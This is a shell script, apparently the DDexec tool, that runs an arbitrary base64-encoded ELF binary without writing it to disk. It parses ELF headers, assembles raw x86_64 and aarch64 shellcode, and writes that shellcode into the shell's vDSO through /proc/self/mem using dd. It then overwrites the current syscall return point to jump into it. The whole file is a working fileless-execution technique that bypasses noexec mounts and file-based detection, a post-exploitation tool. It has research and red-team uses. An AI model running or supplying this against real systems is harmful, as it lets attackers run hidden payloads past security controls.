#!/bin/sh

filename=/bin/dd

# Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
# Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'.
# In ARM64 use `set *(int*)$pc=0xd503201f'.
if [ -z "$DEBUG" ]; then DEBUG=0; fi

# If /bin/dd is not executable by your user you may try to run it through the
# the loader (typically ld).
if [ -z "$USE_INTERP" ]; then USE_INTERP=0; fi

# Endian conversion
endian()
{
    echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
}

sc_chunk()
{
    echo "$sc_array" | grep -w $1 | cut -f2
}
# load_imm $regnum $addr
load_imm()
{
    # A crash course on Aarch64 instruction encoding:
    # 1 10 100101 S[22:21] I[20:5] Rd[4:0] = movz Rd, #I, lsl #(S * 16)
    # 1 11 100101 S[22:21] I[20:5] Rd[4:0] = movk Rd, #I, lsl #(S * 16)
    local opcode=0
    # movz Rd, #(I & 0xffff)
    opcode=$((0xd2800000 | $1 | ((0x$2 & 0xffff) << 5)))
    endian $(printf "%08x" "$opcode")
    if [ $((0x$2)) -gt $((0xffff)) ]
    then
        # movk Rd, #((I >> 16) & 0xffff), lsl #16
        opcode=$((0xf2a00000 | $1 | (((0x$2 >> 16) & 0xffff) << 5)))
        endian $(printf "%08x" "$opcode")
        if [ $((0x$2)) -gt $((0xffffffff)) ]
        then
            # movk Rd, #((I >> 32) & 0xffff), lsl #32
            opcode=$((0xf2c00000 | $1 | (((0x$2 >> 32) & 0xffff) << 5)))
            endian $(printf "%08x" "$opcode")
            if [ $((0x$2)) -gt $((0xffffffffffff)) ]
            then
                # movk Rd, #((I >> 48) & 0xffff), lsl #48
                opcode=$((0xf2e00000 | $1 | (((0x$2 >> 48) & 0xffff) << 5)))
                endian $(printf "%08x" "$opcode")
            fi
        fi
    fi
}

# search_section "file" $filename $section
# search_section "bin" "" $section (and the binary through stdin)
search_section()
{
    local data=""
    if [ $1 = "file" ]
    then
        local header=$(od -v -t x1 -N 64 $2 | head -n -1 |\
                       cut -d' ' -f 2- | tr -d ' \n')
    else
        read -r data
        local header=$(echo -n $data | base64 -d | od -v -t x1 -N 64 |\
                       head -n -1 | cut -d' ' -f 2- | tr -d ' \n')
    fi
    # I'm not commenting this, RTFM.
    local shoff=${header:80:16}
    shoff=$(endian $shoff)
    shoff=$((0x$shoff))
    local shentsize=${header:116:4}
    shentsize=$(endian $shentsize)
    shentsize=$((0x$shentsize))
    local shentnum=${header:120:4}
    shentnum=$(endian $shentnum)
    shentnum=$((0x$shentnum))
    local shsize=$((shentnum * shentsize))
    local shstrndx=${header:124:4}
    shstrndx=$(endian $shstrndx)
    shstrndx=$((0x$shstrndx))
    if [ $1 = "file" ]
    then
        sections=$(od -v -t x1 -N $shsize -j $shoff $2 | head -n-1 |\
            cut -d' ' -f2- | tr -d ' \n')
    else
        sections=$(echo -n $data | base64 -d | od -v -t x1 -N $shsize -j \
                   $shoff | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    fi

    local shstrtab_off=$((((shstrndx * shentsize) + 24) * 2))
    shstrtab_off=${sections:$shstrtab_off:16}
    shstrtab_off=$(endian $shstrtab_off)
    shstrtab_off=$((0x$shstrtab_off))
    local shstrtab_size=$((((shstrndx * shentsize) + 32) * 2))
    shstrtab_size=${sections:$shstrtab_size:16}
    shstrtab_size=$(endian $shstrtab_size)
    shstrtab_size=$((0x$shstrtab_size))
    if [ $1 = "file" ]
    then
        local strtab=$(od -v -t x1 -N $shstrtab_size -j $shstrtab_off $2 |\
                       head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    else
        local strtab=$(echo -n $data | base64 -d | od -v -t x1 -N \
                       $shstrtab_size -j $shstrtab_off | head -n-1 |\
                       cut -d' ' -f2- | tr -d ' \n')
    fi

    for i in $(seq 0 $((shentnum - 1)))
    do
        local section=${sections:$((i * shentsize * 2)):$((shentsize * 2))}
        local section_name_idx=$((0x$(endian ${section:0:8})))
        local name=$(echo -n $3 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
        tr -d ' \n')00
        local section_name=${strtab:$section_name_idx * 2:${#name}}
        if [ $section_name = $name ]
        then
            local section_off=${section:24 * 2:16}
            section_off=$(endian $section_off)
            section_off=$((0x$section_off))

            local section_addr=${section:16 * 2:16}
            section_addr=$(endian $section_addr)
            section_addr=$((0x$section_addr))

            local section_size=${section:32 * 2:16}
            section_size=$(endian $section_size)
            section_size=$((0x$section_size))

            local section_size_ent=${section:56 * 2:16}
            section_size_ent=$(endian $section_size_ent)
            section_size_ent=$((0x$section_size_ent))

            echo -n $section_off $section_size $section_addr $section_size_ent
            break
        fi
    done
}

# shellcode_loader "bin"
# shellcode_loader "file" $filename $base $pathaddr
shellcode_loader()
{
    if [ $1 = "bin" ]
    then
        local header=$(echo $bin | base64 -d | od -t x1 -N 64 | head -n-1 |\
                       cut -d' ' -f2- | tr -d ' \n')
    else
        local header=$(od -tx1 -N 64 $2 | head -n-1 | cut -d' ' -f2- |\
                       tr -d ' \n')
    fi
    local phoff=$((0x$(endian ${header:64:16})))
    local phentsize=$((0x$(endian ${header:108:4})))
    local phnum=$((0x$(endian ${header:112:4})))
    local phsize=$(($phnum * $phentsize))
    if [ $1 = "bin" ]
    then
        local phtab=$(echo $bin | base64 -d | od -vtx1 -N $phsize -j $phoff |\
                      head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    else
        local phtab=$(od -vtx1 -N $phsize -j $phoff $2 | head -n-1 |\
                      cut -d' ' -f2- | tr -d ' \n')
    fi

    local entry=$((0x$(endian ${header:48:16})))

    local base=0
    local writebin=""
    local sc=""
    if [ $1 = "bin" ]
    then
        sc=$sc$(eval echo $(sc_chunk prep)) # Prepare for the mmap()s
    else
        # open() and prepare for the mmap()s
        sc=$sc$(eval echo $(sc_chunk openprep))
    fi

    for i in $(seq 0 $((phnum - 1)))
    do
        local phent=${phtab:$((i * phentsize * 2)):$((phentsize * 2))}
        local phenttype=${phent:0:8}
        local prot=$(endian ${phent:8:8})
        if [ $phenttype = "51e57464" ] # type == GNU_STACK
        then
            if [ $((0x$prot & 1)) -eq 1 ] # Stack must be executable
            then
                local stack_bottom=$(echo "$shell_maps" | grep -F "[stack]" |\
                                     cut -d' ' -f1)
                local stack_top=$(echo $stack_bottom | cut -d'-' -f2)
                local stack_bottom=0000$(echo $stack_bottom | cut -d'-' -f1)
                local stack_size=$((0x$stack_top - 0x$stack_bottom))
                stack_size=$(printf %08x $stack_size)
                sc=$sc$(eval echo $(sc_chunk stackexe))
            fi
            continue
        fi
        if [ $phenttype != "01000000" ]; then continue; fi # type != LOAD
        local offset=$(endian ${phent:16:16})
        local virt=$(endian ${phent:32:16})
        local fsize=$(endian ${phent:64:16})
        local memsz=$(endian ${phent:80:16})

        if [ $((0x$offset)) -eq 0 ]
        then
            if [ $((0x$virt)) -lt $((0x400000)) ] # PIE binaries
            then
                if [ $1 = "bin" ]
                then
                    base=$((0x400000))
                else
                    base=$((0x$3))
                fi
                entry=$((entry + base))
            fi
        fi
        virt=$(printf %016x $((0x$virt + base)))

        local finalvirt=$((((0x$virt + 0x$memsz) & (~0xfff)) + 0x1000))

        local origvirt=$virt
        virt=$((0x$virt & (~0xfff))) # The mapping must be aligned
        memsz=$((finalvirt - virt)) # True size of the mapping
        memsz=$(printf %08x $memsz)
        virt=$(printf %016x $virt)

        local perm=0
        if [ $((0x$prot & 1)) -eq 1 ]; then perm=$((perm | 4)); fi
        if [ $((0x$prot & 2)) -eq 2 ]; then perm=$((perm | 2)); fi
        if [ $((0x$prot & 4)) -eq 4 ]; then perm=$((perm | 1)); fi
        perm=$(printf %08x $perm)
        if [ $1 = "bin" ]
        then
            # mmap() (RW) & read() (preventing underflow) & mprotect()
            sc=$sc$(eval echo $(sc_chunk mrmbin))

            # Pieces of the binary that we need to write
            # (we only load things the binary itself asks us to)
            writebin=$writebin$(echo $bin | base64 -d | od -v -t x1 -N \
                     $((0x$fsize)) -j $((0x$offset)) |\
                     head -n-1 | cut -d' ' -f2- | tr -d ' \n')
        else
            # mmap requires the offset to be aligned to 0x1000 too
            local off=$((0x$offset & (~0xfff)))
            off=$(printf %016x $off)

            local sc2=""
            local filelen=$((($(wc -c < $2) & (~0xfff)) + 0x1000))
            # If the mapping exceeds the file, split it into two
            # (some Linux distros, like Alpine, don't like it)
            if [ $((0x$off + 0x$memsz)) -gt $filelen ]
            then
                local diff=$((0x$off + 0x$memsz - $filelen))
                memsz=$((0x$memsz - diff))
                local virt2=$((0x$virt + memsz))
                virt2=$(printf %016x $virt2)
                memsz=$(printf %08x $memsz)
                diff=$(printf %08x $diff)
                sc2=$sc2$(eval echo $(sc_chunk mrmfile2)) # mmap()
            fi

            sc=$sc$(eval echo $(sc_chunk mrmfile)) # mmap()

            sc=$sc$sc2
        fi

        if [ $((0x$offset)) -eq 0 ]
        then
            phaddr=$((phoff + 0x$origvirt))
        fi
    done
    entry=$(endian $(printf %016x $entry))

    # Zero the bss
    local bss_addr=0
    if [ $1 = "file" ]
    then
        sc=$sc$(eval echo $(sc_chunk close)) # close()
        bss_addr=$(search_section file $2 .bss | cut -d' ' -f3)
    else
        bss_addr=$(echo -n $bin | search_section bin "" .bss | cut -d' ' -f3)
    fi
    if [ -n "$bss_addr" ]
    then
        bss_addr=$((bss_addr + base))
        # Zero until the end of page
        local bss_size=$((((bss_addr + 0x1000) & (~0xfff)) - bss_addr))
        bss_addr=$(printf %016x $bss_addr)
        bss_size=$(printf %08x $((bss_size >> 3)))
        sc=$sc$(eval echo $(sc_chunk zerobss))
    fi

    phnum=$(endian $(printf %016x $phnum))
    phentsize=$(endian $(printf %016x $phentsize))
    phaddr=$(endian $(printf %016x $phaddr))

    echo -n "$sc $writebin $phnum $phentsize $phaddr $entry"
}
# craft_stack $phaddr $phentsize $phnum $ld_base $entry $argv0 .. $argvn
craft_stack()
{
    local stack_top=$(echo "$shell_maps" | grep -F "[stack]" |\
                      cut -d' ' -f1 | cut -d'-' -f2)
    # Calculate position of argv[0]
    args_len=$(echo "$@" | cut -d' ' -f6- | wc -c)
    argv0_addr=$((0x$stack_top - 8 - $args_len))

    # Place arguments for main()
    local count=0
    local stack=$(endian $(printf %016x $(($# - 5)))) # argc
    local argvn_addr=$argv0_addr
    local args=""
    for arg in "$@"
    do
        if [ $count -lt 5 ]; then count=$((count + 1)); continue; fi;
        stack=$stack$(endian $(printf %016x $argvn_addr)) # argv[n]
        args=$args$(printf "%s" "$arg" | od -v -t x1 | head -n -1 |\
                    cut -d' ' -f 2- | tr -d ' \n')00
        argvn_addr=$((argvn_addr + ${#arg} + 1))
    done
    # argv[argc] = NULL; envp[0] = NULL;
    stack=$stack"00000000000000000000000000000000"

    for i in $(seq $((argv0_addr - (argv0_addr & (~7)))))
    do
        args="00"$args
    done

    local at_random=$(((argv0_addr & (~7)) - 16))
    local auxv_len=$((8 * 2 * 8))
    # Keep the stack aligned (following orders from System V)
    if [ $((((${#stack} + ${#args} + $auxv_len) / 2) & 0xf)) -eq 0 ]
    then
        args="0000000000000000"$args
        at_random=$((at_random - 8))
    fi

    # Auxiliary vector
    at_random=$(endian $(printf %016x $at_random))
    local auxv=""
    auxv=$auxv"0300000000000000"$1                 # phaddr
    auxv=$auxv"0400000000000000"$2                 # phentsize
    auxv=$auxv"0500000000000000"$3                 # phnum
    auxv=$auxv"0700000000000000"$(endian $4)       # ld_base
    auxv=$auxv"0900000000000000"$5                 # entry
    auxv=$auxv"1900000000000000"$at_random         # AT_RANDOM
    auxv=$auxv"0600000000000000""0010000000000000" # AT_PAGESZ
    auxv=$auxv"0000000000000000""0000000000000000" # AT_NULL
    auxv=$auxv"aaaaaaaaaaaaaaaa""bbbbbbbbbbbbbbbb" # Should be two random values

    stack=$stack$auxv$args"0000000000000000" # NULL at the end of the stack

    # read() all this data into the stack and make the sp point to it
    local sc=""
    local stack_len=$((${#stack} / 2))
    local sp=$(printf %016x $((0x$stack_top - $stack_len)))
    stack_len=$(printf %08x $stack_len)
    sc=$sc$(eval echo $(sc_chunk stack))

    # Reuse canary and PTR_MANGLE key, place them in AT_RANDOM field of the auxv
    sc=$sc
    sc=$sc$(eval echo $(sc_chunk canary))

    echo -n $stack $sc
}
craft_shellcode()
{
    local sc=""
    # Load binary
    local loadbinsc=$(shellcode_loader bin)
    local writebin=$(echo $loadbinsc | cut -d' ' -f2)
    local phnum=$(echo $loadbinsc | cut -d' ' -f3)
    local phentsize=$(echo $loadbinsc | cut -d' ' -f4)
    local phaddr=$(echo $loadbinsc | cut -d' ' -f5)
    local entry=$(echo $loadbinsc | cut -d' ' -f6)
    sc=$sc$(echo $loadbinsc | cut -d' ' -f1)

    # Where to load the loader
    if [ -n "$interp" ]
    then
        local ld_base=0000$(echo "$shell_maps" | grep `readlink -f $interp` |\
                            head -n1 | cut -d'-' -f1)
        if [ $((0x$ld_base)) -eq 0 ] # The shell may be static or using musl
        then
            ld_base="00000000fffff000"
        fi
    fi

    ### Initial stack structures. Arguments and a rudimentary auxv ###
    local stack=$(craft_stack $phaddr $phentsize $phnum $ld_base $entry "$@")
    sc=$sc$(echo $stack | cut -d' ' -f2)
    stack=$(echo $stack | cut -d' ' -f1)

    # The shell has the stdin pointing to a pipe, so we make dup2(2, 0)
    sc=$sc$(eval echo $(sc_chunk dup))

    if [ -n "$interp" ] # Dynamic binary
    then
        # Load the loader (wait... a-are we the kernel now?)
        local loadldsc=$(shellcode_loader file $interp $ld_base)
        sc=$sc$(echo $loadldsc | cut -d' ' -f1)

        # Jump to the loader and let it do the rest
        ld_start_addr=$(od -t x8 -j 24 -N 8 $interp | head -n1 | cut -d' ' -f2)
        ld_start_addr=$((0x$ld_start_addr + 0x$ld_base))
        ld_start_addr=$(printf %016x $ld_start_addr)

        sc=$sc$(eval echo $(sc_chunk jmpld))
    else                                                        # Static binary
        sc=$sc$(eval echo $(sc_chunk jmpbin)) # Just jump to the binary's entry
    fi
    # Nothing happened here, dd never existed.
    # It was all a dream!
    sc=$sc$(eval echo $(sc_chunk jmp))

    if [ $DEBUG -eq 1 ]; then sc=$(eval echo $(sc_chunk loop))$sc; fi

    printf "$sc $writebin$stack"
}

arch=$(uname -m)
if [ "$arch" = "x86_64" ]
then
    sc_array='prep	4d31c04d89c149f7d041ba32000000
openprep	4831c04889c6b00248bf________________0f054989c041ba12000000
stackexe	4831c0b00a48bf$(endian $stack_bottom)be$(endian $stack_size)ba070000000f05
mrmbin	4831c0b00948bf$(endian $virt)be$(endian $memsz)ba030000000f054831ff48be$(endian $origvirt)48ba$(endian $fsize)4889f80f054829c24801c64885d275f04831c0b00a48bf$(endian $virt)be$(endian $memsz)ba$(endian $perm)0f05
mrmfile2	4d89c44d31c04d89c149f7d041ba320000004831c0b00948bf$(endian $virt2)be$(endian $diff)ba$(endian $perm)0f054d89e0
mrmfile	4831c0b00948bf$(endian $virt)be$(endian $memsz)ba$(endian $perm)49b9$(endian $off)0f05
close	4831c0b0034c89c70f05
zerobss	4831c0b9$(endian $bss_size)48bf$(endian $bss_addr)f348ab
stack	48bc$(endian $sp)4831ff4889e6ba$(endian $stack_len)4889f80f0529c24801c685d275f3
canary	48bb${at_random}64488b04252800000048890380c30864488b042530000000488903
dup	4831c04889c6b0024889c7b0210f05
jmpld	48b8$(endian $ld_start_addr)
jmpbin	48b8$entry
jmp	ffe0
loop	ebfe
'
elif [ "$arch" = "aarch64" ]
then
    sc_array='prep	430680d204008092a50005ca
openprep	080780d2600c8092420002ca________________010000d4e40300aa430280d2
stackexe	481c80d2$(load_imm 0 $stack_bottom)$(load_imm 1 $stack_size)$(load_imm 2 00000007)010000d4
mrmbin	c81b80d2$(load_imm 0 $virt)$(load_imm 1 $memsz)$(load_imm 2 00000003)010000d4e80780d2$(load_imm 1 $origvirt)$(load_imm 2 $fsize)000000ca010000d4420000cb2100008b5f0000f161ffff54481c80d2$(load_imm 0 $virt)$(load_imm 1 $memsz)$(load_imm 2 $perm)010000d4
mrmfile2	f30304aa04008092a50005ca430680d2c81b80d2$(load_imm 0 $virt2)$(load_imm 1 $diff)$(load_imm 2 $perm)010000d4e40313aa
mrmfile	c81b80d2$(load_imm 0 $virt)$(load_imm 1 $memsz)$(load_imm 2 $perm)$(load_imm 5 $off)010000d4
close	280780d2e00304aa010000d4
zerobss	$(load_imm 0 $bss_addr)$(load_imm 1 $bss_size)1f8400f8210400d13f0000f1a1ffff54
stack	$(load_imm 0 $sp)1f000091$(load_imm 2 $stack_len)e80780d2e1030091000000ca010000d4420000cb2100008b5f0000f161ffff54
canary	
dup	080380d2400080d2010080d2010000d4
jmpld	$(load_imm 0 $ld_start_addr)
jmpbin	$(load_imm 0 $(endian $entry))
jmp	00001fd6
loop	00000014
'
else
    echo "DDexec: Error, this architecture is not supported." >&2
    exit
fi

# Program we are trying to run
read -r bin

shell=$(readlink -f /proc/$$/exe)

# Make zsh behave somewhat like bash
if [ -n "$($shell --version 2> /dev/null | grep zsh)" ]
then
    setopt SH_WORD_SPLIT
    setopt KSH_ARRAYS
fi

# Interpreter (loader) for the binary
interp_off=$(echo -n $bin | search_section bin "" .interp)
if [ -n "$interp_off" ]
then
    interp_size=$(echo "$interp_off" | cut -d' ' -f2)
    interp_off=$(echo "$interp_off" | cut -d' ' -f1)
    interp=$(echo $bin | base64 -d | tail -c +$(($interp_off + 1)) |\
             head -c $((interp_size - 1)))
fi
# Interpreter (loader) for dd
if [ $USE_INTERP -eq 1 ]
then
    interp_off=$(search_section file $filename .interp)
    if [ -n "interp_off" ]
    then
        interp_size=$(echo $interp_off | cut -d' ' -f2)
        interp_off=$(echo $interp_off | cut -d' ' -f1)
        interp_=$(tail -c +$(($interp_off + 1)) $filename |\
                  head -c $((interp_size - 1)))
    fi
fi

# Shell's mappings
shell_maps=$(cat /proc/$$/maps)
shell_base=$(echo "$shell_maps" | grep -w $shell |\
            head -n1 | cut -d'-' -f1)

# The shellcode will be written into the vDSO
vdso_addr=$((0x$(echo "$shell_maps" | grep -F "[vdso]" | cut -d'-' -f1)))

## Payload: Shellcode, needed parts of the binary & stack's initial content
sc=$(craft_shellcode "$@")
data=$(echo $sc | cut -d' ' -f2)
sc=$(echo $sc | cut -d' ' -f1)
sc_len=$((${#sc} / 2))

sc=$sc$(echo -n $interp | od -vtx1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')00
if [ "$arch" = "x86_64" ]
then
    interp_addr=$(printf %016x $((vdso_addr + sc_len)))
    sc=${sc/________________/$(endian $interp_addr)}
elif [ "$arch" = "aarch64" ]
then
    # Relative addressing
    pos=${sc%%_*}
    pos=$((${#pos} / 2))
    rel=$((((((sc_len - pos) >> 2) << 5) | 1) | (16 << 24)))
    rel=$(endian $(printf %08x $rel))"1f2003d5"
    sc=${sc/________________/$rel}
fi
sc_len=$((${#sc} / 2))

# Trampoline to jump to the shellcode
if [ "$arch" = "x86_64" ]
then
    jmp="48b8"$(endian $(printf %016x $vdso_addr))"ffe0"
elif [ "$arch" = "aarch64" ]
then
    jmp=$(load_imm 0 $(printf %016x $vdso_addr))"00001fd6"
fi

sc=$(printf $sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
data=$(printf $data | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
jmp=$(printf $jmp | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')

read syscall_info < /proc/self/syscall
addr=$(($(echo $syscall_info | cut -d' ' -f9)))
exec 0< <(printf $data)
exec 3>/proc/self/mem
# Write the shellcode
printf $sc  | $interp_ $filename bs=1 seek=$vdso_addr >&3 2>/dev/null
exec 3>&-
exec 3>/proc/self/mem
# I'm going in, wish me good luck
printf $jmp | $interp_ $filename bs=1 seek=$addr      >&3 2>/dev/null
